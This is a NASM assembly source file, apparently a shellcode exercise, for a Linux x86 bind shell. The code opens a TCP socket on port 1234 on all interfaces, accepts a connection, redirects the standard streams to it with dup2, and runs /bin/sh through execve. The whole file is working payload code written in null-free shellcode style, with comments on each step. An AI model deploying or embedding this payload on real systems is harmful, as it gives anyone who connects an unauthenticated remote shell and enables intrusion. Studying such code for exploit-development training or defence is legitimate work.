section .text
    global _start

_start:
    ; Reference: socketcall(int call, unsigned long *args)

    ; Create listening socket: EAX = socket(AF_INET, SOCK_STREAM, 0)
    ; EAX will contain listening socket file descriptor
    xor ebx, ebx  ; zero out ebx
    mul ebx       ; implicitly zero out eax and edx 
    mov al, 0x66  ; socketcall syscall #
    mov bl, 0x1   ; socket function #
    push edx      ; 3rd arg to socket function
    push byte 0x1 ; SOCK_STREEAM - 2nd arg to socket function
    push byte 0x2 ; 1st arg: socket domain = 2 (AF_INET)
    mov ecx, esp  ; Copy args address to ECX 
    int 0x80
   
    ; Bind previously created socket to 0.0.0.0 interface and 1234 port   
    ; EAX = bind(listen_sock, &sockaddr_in, sizeof(sockaddr_in))
    ; EAX will be 0 on success
    xchg edi, eax  ; save listening socket descriptor to edi
    xor eax, eax   ; zero out eax
    mov al, 0x66   ; socketcall syscall #
    pop ebx        ; bind func # (reusing 1st arg of the prev func)
    pop esi        ; trashing 4 bytes from the stack 
    push edx       ; sockaddr_in.sin_addr.s_addr (INADDR_ANY=0)
    push word port ; sockaddr_in.sin_port = 1234
    push word bx   ; sin_family = 2 (AF_INET)
    push byte 16   ; addr_len = 16 (structure size) (we don't care about last 8 bytes)
    push ecx       ; Copy args address to ECX 
    push edi       ; Listening socket descriptor
                   ; Stack is now 0x0000000 [0x00000000, 0xd204, 0x0002], 
                   ; 0x00000010, &sockaddr_in, socketfd
    mov ecx, esp   ; Copy listening socket descriptor address to ECX 
    int 0x80               
   
    ; Start listening: EAX = listen (sockfd, backlog)
    xor edi, edi
    pop edx       ; Save socketfd
    push edi      ; 2nd arg to listen func (0)
    push edx      ; 1st arg to listen func (listening socket)
    mov bl, 0x4   ; listen function #
    mov ecx, esp  ; Address to args structure on stack
    mov al, 0x66  ; socketcall sycall #
    int 0x80   
  
    ; Accept incoming connections: accept(sockfd, addr, arrlen)
    ; On success EAX will contain incoming socket descriptor
    push edi      ; 3rd arg to accept func (0)
    push edi      ; 2nd arg to accept func (0)
    push edx      ; 1st arg to accept func (listening socket)
    mov ecx, esp  ; Copy address to args to ECX
    mov al, 0x66  ; socketcall syscall #
    mov bl, 0x5   ; accept function #
    int 0x80   
   
   
    ; Redirect process's stdin/out/err to the incoming socket   
    xchg eax, ebx  ; 1st syscall arg in EBX = incoming socket fd
    pop ecx        ; 2nd syscall arg in ECX = listening socket fd 
.next_fd:          ; Redirect all process's fds ot incoming socket fd
    mov al, 0x3f   ; dup2 syscall #
    int 0x80        
    dec ecx         
    jns .next_fd   ; loop until ECX == -1 

    ; Start the shell 
    push edi               ; push some delimiting nulls
    push dword 0x68732f2f  ; push /bin//sh string 
    push dword 0x6e69622f  
    mov ebx, esp           ; 1st syscall arg: program address
    push edi               ; push delimiting nulls 
    mov edx, esp           ; 3rd syscall arg: env vars  
    push ebx               ; Push program address string creating args array
    mov ecx, esp           ; 2nd syscall arg: args
    mov al, 0xb            ; execve syscall #
    int 0x80

    port: equ 0xD204 ; = 1234 in little endian notation
